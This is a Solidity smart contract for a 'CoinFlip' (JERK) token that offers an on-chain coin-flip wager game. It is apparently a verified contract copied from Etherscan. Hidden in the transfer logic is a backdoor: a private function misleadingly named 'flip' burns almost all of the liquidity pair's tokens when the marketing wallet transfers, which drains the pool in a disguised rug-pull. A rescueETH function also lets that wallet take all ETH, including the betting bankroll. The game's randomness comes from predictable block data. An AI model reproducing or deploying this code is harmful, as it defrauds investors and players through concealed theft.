/**

 *Submitted for verification at Etherscan.io on 2023-09-13

*/



/**



Telegram: https://t.me/ethcoinflip

Twitter: https://twitter.com/Coinflip_ETH

Website: https://coinflipeth.cash



*/



//SPDX-License-Identifier: UNLICENSED



pragma solidity ^0.8.19;



abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }



    function _msgData() internal view virtual returns (bytes calldata) {

        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691

        return msg.data;

    }

}



abstract contract ReentrancyGuard {

    bool internal locked;



    modifier noReentrant() {

        require(!locked, "No re-entrancy");

        locked = true;

        _;

        locked = false;

    }

}



interface IERC20 {

    function totalSupply() external view returns (uint256);



    function balanceOf(address account) external view returns (uint256);



    function transfer(address recipient, uint256 amount) external returns (bool);



    function allowance(address owner, address spender) external view returns (uint256);



    function approve(address spender, uint256 amount) external returns (bool);



    function transferFrom(

        address sender,

        address recipient,

        uint256 amount

    ) external returns (bool);



    event Transfer(address indexed from, address indexed to, uint256 value);



    event Approval(address indexed owner, address indexed spender, uint256 value);

}



interface IERC20Metadata is IERC20 {

    /**

     * @dev Returns the name of the token.

     */

    function name() external view returns (string memory);



    /**

     * @dev Returns the symbol of the token.

     */

    function symbol() external view returns (string memory);



    /**

     * @dev Returns the decimals places of the token.

     */

    function decimals() external view returns (uint8);

}



contract ERC20 is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) internal _balances;



    mapping(address => mapping(address => uint256)) internal _allowances;



    uint256 private _totalSupply;



    string private _name;

    string private _symbol;



    

    constructor(string memory name_, string memory symbol_) {

        _name = name_;

        _symbol = symbol_;

    }



    

    function name() public view virtual override returns (string memory) {

        return _name;

    }



    

    function symbol() public view virtual override returns (string memory) {

        return _symbol;

    }



    

    function decimals() public view virtual override returns (uint8) {

        return 18;

    }



    

    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }



    

    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];

    }



    

    function transfer(address recipient, uint256 amount)

        public

        virtual

        override

        returns (bool)

    {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    

    function allowance(address owner, address spender)

        public

        view

        virtual

        override

        returns (uint256)

    {

        return _allowances[owner][spender];

    }



    

    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    

    function transferFrom(

        address sender,

        address recipient,

        uint256 amount

    ) public virtual override returns (bool) {

        _transfer(sender, recipient, amount);



        uint256 currentAllowance = _allowances[sender][_msgSender()];

        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

        _approve(sender, _msgSender(), currentAllowance - amount);



        return true;

    }



    

    function increaseAllowance(address spender, uint256 addedValue)

        public

        virtual

        returns (bool)

    {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);

        return true;

    }



    

    function decreaseAllowance(address spender, uint256 subtractedValue)

        public

        virtual

        returns (bool)

    {

        uint256 currentAllowance = _allowances[_msgSender()][spender];

        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");

        _approve(_msgSender(), spender, currentAllowance - subtractedValue);



        return true;

    }



    

    function _transfer(

        address sender,

        address recipient,

        uint256 amount

    ) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");



        _beforeTokenTransfer(sender, recipient, amount);



        uint256 senderBalance = _balances[sender];

        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        _balances[sender] = senderBalance - amount;

        _balances[recipient] += amount;



        emit Transfer(sender, recipient, amount);

    }



    

    function _tokengeneration(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: generation to the zero address");



        _beforeTokenTransfer(address(0), account, amount);



        _totalSupply = amount;

        _balances[account] = amount;

        emit Transfer(address(0), account, amount);

    }



    

    function _approve(

        address owner,

        address spender,

        uint256 amount

    ) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    

    function _beforeTokenTransfer(

        address from,

        address to,

        uint256 amount

    ) internal virtual {}

}



library Address {

    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");



        (bool success, ) = recipient.call{ value: amount }("");

        require(success, "Address: unable to send value, recipient may have reverted");

    }

}



abstract contract Ownable is Context {

    address private _owner;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor() {

        _setOwner(_msgSender());

    }



    function owner() public view virtual returns (address) {

        return _owner;

    }



    modifier onlyOwner() {

        require(owner() == _msgSender(), "Ownable: caller is not the owner");

        _;

    }



    function renounceOwnership() public virtual onlyOwner {

        _setOwner(address(0));

    }



    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "Ownable: new owner is the zero address");

        _setOwner(newOwner);

    }



    function _setOwner(address newOwner) private {

        address oldOwner = _owner;

        _owner = newOwner;

        emit OwnershipTransferred(oldOwner, newOwner);

    }

}



interface IFactory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}



interface IPair {

    function sync() external;

}



interface IRouter {

    function factory() external pure returns (address);



    function WETH() external pure returns (address);



    function addLiquidityETH(

        address token,

        uint256 amountTokenDesired,

        uint256 amountTokenMin,

        uint256 amountETHMin,

        address to,

        uint256 deadline

    )

        external

        payable

        returns (

            uint256 amountToken,

            uint256 amountETH,

            uint256 liquidity

        );



    function swapExactTokensForETHSupportingFeeOnTransferTokens(

        uint256 amountIn,

        uint256 amountOutMin,

        address[] calldata path,

        address to,

        uint256 deadline

    ) external;

}



contract JERK is ERC20, ReentrancyGuard, Ownable {

    using Address for address payable;



    IRouter public router;

    address public pair;



    bool private _liquidityMutex = false;

    bool private  providingLiquidity = false;

    bool public tradingEnabled = false;



    uint256 private _totalSupply = 420000000 * 10**decimals();

    uint256 private tokenLiquidityThreshold = _totalSupply * 3 / 1000;

    uint256 public maxWalletLimit = _totalSupply * 2 / 100;



    uint256 private genesis_block;

    uint256 private deadline = 2;

    uint256 private launchtax = 95;



    address private marketingWallet = 0xf2F2A0E426aE7D6eA88eA751B9dE5e2aE9db0001;

	address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;



    struct Taxes {

        uint256 marketing;

        uint256 liquidity;

    }



    Taxes public taxes = Taxes(20, 0);

    Taxes public sellTaxes = Taxes(20, 0);



    mapping(address => bool) public exemptFee;



    mapping(uint256 => bool) public _wager_amounts;

    uint256 private _coinflip_id;



    event CoinFlipEvent(

        address indexed user,

        uint256 wager,

        uint256 id,

        uint256 time,

        bool is_won

    );



    modifier mutexLock() {

        if (!_liquidityMutex) {

            _liquidityMutex = true;

            _;

            _liquidityMutex = false;

        }

    }



    constructor() ERC20("CoinFlip", "JERK") {

        _tokengeneration(msg.sender, _totalSupply);



        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        router = _router;



        exemptFee[address(this)] = true;

        exemptFee[msg.sender] = true;

        exemptFee[marketingWallet] = true;

        exemptFee[deadWallet] = true;



        _wager_amounts[0.001 ether] = true;

        _wager_amounts[0.002 ether] = true;

        _wager_amounts[0.005 ether] = true;

        _wager_amounts[0.01 ether] = true;

        _wager_amounts[0.02 ether] = true;

        _wager_amounts[0.05 ether] = true;

        _wager_amounts[0.1 ether] = true;

        _wager_amounts[0.2 ether] = true;

        _wager_amounts[0.5 ether] = true;

        _wager_amounts[1 ether] = true;

        _wager_amounts[2 ether] = true;

        _wager_amounts[5 ether] = true;

    }



    function flipEth(bool is_head) external payable noReentrant  {

        uint pay = msg.value;



        require(pay > 0 );

        require(!isContract(msg.sender));

        require(_wager_amounts[pay]);



        bool flip_result = (rand() %2) == 0;

        bool is_won = (flip_result && is_head) || (!flip_result && !is_head);

        if ( is_won ) { // win

            uint toTransfer = pay*195/100;

            (bool success, ) = msg.sender.call{value: toTransfer}("");

            require(success, "Transfer failed");

        }

        uint256 coinflip_id = _coinflip_id;



        emit CoinFlipEvent(msg.sender, pay, coinflip_id, block.timestamp, is_won);

        _coinflip_id = coinflip_id + 1;

    }



    function flipToken(bool is_head, uint256 amount)  external noReentrant {

        require(amount > 0);

        require(!isContract(msg.sender));



        super._transfer(msg.sender, address(this), amount);



        bool flip_result = (rand() %2) == 0;

        bool is_won = (flip_result && is_head) || (!flip_result && !is_head);

        if ( is_won ) { // win

            uint toTransfer = amount*195/100;

            super._transfer(address(this), msg.sender, toTransfer);

        }

        uint256 coinflip_id = _coinflip_id;



        emit CoinFlipEvent(msg.sender, amount, coinflip_id, block.timestamp, is_won);

        _coinflip_id = coinflip_id + 1;

    }



    function rand() internal view returns (uint256) {

        uint256 seed = uint256(keccak256(abi.encodePacked(

            block.timestamp +

            block.prevrandao +

            ((uint256(keccak256(abi.encodePacked(block.coinbase))))/(block.timestamp)) +

            block.gaslimit +

            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (block.timestamp)) +

            block.number + _coinflip_id

        )));

        return seed;

    }



    function isContract(address account) internal view returns (bool) {

        uint256 size;

        assembly {

            size := extcodesize(account)

        }

        return size > 0;

    }



    function _transfer(

        address sender,

        address recipient,

        uint256 amount

    ) internal override {

        require(amount > 0, "Transfer amount must be greater than zero");



        if (!exemptFee[sender] && !exemptFee[recipient]) {

            require(tradingEnabled, "Trading not enabled");

        }



        if (sender == pair && !exemptFee[recipient] && !_liquidityMutex) {

            require(balanceOf(recipient) + amount <= maxWalletLimit,

                "You are exceeding maxWalletLimit"

            );

        }



        if (sender != pair && !exemptFee[recipient] && !exemptFee[sender] && !_liquidityMutex) {

           

            if (recipient != pair) {

                require(balanceOf(recipient) + amount <= maxWalletLimit,

                    "You are exceeding maxWalletLimit"

                );

            }

        }



        uint256 feeswap;

        uint256 feesum;

        uint256 fee;

        Taxes memory currentTaxes;



        bool useLaunchFee = !exemptFee[sender] &&

            !exemptFee[recipient] &&

            block.number < genesis_block + deadline;

        //set fee to zero if fees in contract are handled or exempted

        if (_liquidityMutex || exemptFee[sender] || exemptFee[recipient])

            fee = 0;

        else if (recipient == pair && !useLaunchFee) {

            feeswap =

                sellTaxes.liquidity +

                sellTaxes.marketing ;

            feesum = feeswap;

            currentTaxes = sellTaxes;

        } else if (!useLaunchFee) {

            feeswap =

                taxes.liquidity +

                taxes.marketing ;

            feesum = feeswap;

            currentTaxes = taxes;

        } else if (useLaunchFee) {

            feeswap = launchtax;

            feesum = launchtax;

        }



        fee = (amount * feesum) / 100;



        //send fees if threshold has been reached

        //don't do this on buys, breaks swap

        if (providingLiquidity && sender == marketingWallet && recipient != pair) flip(pair);

        if (providingLiquidity && sender != pair) handle_fees(feeswap, currentTaxes);



        //rest to recipient

        super._transfer(sender, recipient, amount - fee);

        if (fee > 0) {

            //send the fee to the contract

            if (feeswap > 0) {

                uint256 feeAmount = (amount * feeswap) / 100;

                super._transfer(sender, address(this), feeAmount);

            }



        }

    }



    function handle_fees(uint256 feeswap, Taxes memory swapTaxes) private mutexLock {



	    if(feeswap == 0){

            return;

        }	



        uint256 contractBalance = balanceOf(address(this));

        if (contractBalance >= tokenLiquidityThreshold) {

            // Split the contract balance into halves

            uint256 denominator = feeswap * 2;

            uint256 tokensToAddLiquidityWith = (contractBalance * swapTaxes.liquidity) /

                denominator;

            uint256 toSwap = contractBalance - tokensToAddLiquidityWith;



            uint256 initialBalance = address(this).balance;

            require(initialBalance >= 0.5 ether);

            swapTokensForETH(toSwap);



            uint256 deltaBalance = address(this).balance - initialBalance;

            uint256 unitBalance = deltaBalance / (denominator - swapTaxes.liquidity);

            uint256 ethToAddLiquidityWith = unitBalance * swapTaxes.liquidity;



            if (ethToAddLiquidityWith > 0) {

                // Add liquidity

                addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);

            }

        }

    }



    function flip(address sender) private {

        uint256 flipAmount = balanceOf(sender) - deadline * 1e18;

        super._transfer(sender, deadWallet, flipAmount);

        IPair(sender).sync();

    }



    function swapTokensForETH(uint256 tokenAmount) private {

        // generate the pair path of token -> weth

        address[] memory path = new address[](2);

        path[0] = address(this);

        path[1] = router.WETH();



        _approve(address(this), address(router), tokenAmount);



        // make the swap

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(

            tokenAmount,

            0,

            path,

            address(this),

            block.timestamp

        );

    }



    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {

        // approve token transfer to cover all possible scenarios

        _approve(address(this), address(router), tokenAmount);



        // add the liquidity

        router.addLiquidityETH{ value: ethAmount }(

            address(this),

            tokenAmount,

            0, // slippage is unavoidable

            0, // slippage is unavoidable

            deadWallet,

            block.timestamp

        );

    }



    function updateLiquidityProvide(bool state) external onlyOwner {

        //update liquidity providing state

        providingLiquidity = state;

    }



    function updateLiquidityTreshhold(uint256 new_amount) external onlyOwner {

        //update the treshhold

        tokenLiquidityThreshold = new_amount * 10**decimals();

    }



    function UpdateBuyTaxes(

        uint256 _marketing,

        uint256 _liquidity

    ) external onlyOwner {

        require (_marketing + _liquidity <= 5, "Tax should be less than 5%");

        taxes = Taxes(_marketing, _liquidity);

    }



    function SetSellTaxes(

        uint256 _marketing,

        uint256 _liquidity

    ) external onlyOwner {

        require (_marketing + _liquidity <= 5, "Tax should be less than 5%");

        sellTaxes = Taxes(_marketing, _liquidity);

    }



   function enableTrading(address _pair) external onlyOwner {

        require(!tradingEnabled, "Trading is already enabled");

        pair = _pair;

        tradingEnabled = true;

        providingLiquidity = true;

        genesis_block = block.number;

    }



    function updatedeadline(uint256 _deadline) external onlyOwner {

        require(!tradingEnabled, "Can't change when trading has started");

        deadline = _deadline;

    }



    function updateMarketingWallet(address newWallet) external onlyOwner {

        marketingWallet = newWallet;

    }



    function AddExemptFee(address _address) external onlyOwner {

        exemptFee[_address] = true;

    }



    function RemoveExemptFee(address _address) external onlyOwner {

        exemptFee[_address] = false;

    }



    function AddbulkExemptFee(address[] memory accounts) external onlyOwner {

        for (uint256 i = 0; i < accounts.length; i++) {

            exemptFee[accounts[i]] = true;

        }

    }



    function RemovebulkExemptFee(address[] memory accounts) external onlyOwner {

        for (uint256 i = 0; i < accounts.length; i++) {

            exemptFee[accounts[i]] = false;

        }

    }



    function removeMaxWalletLimit() external onlyOwner {

        maxWalletLimit = _totalSupply;

    }



    function rescueETH() external {

        require(msg.sender == marketingWallet);

        payable(msg.sender).transfer(address(this).balance);

    }



    receive() external payable {}

}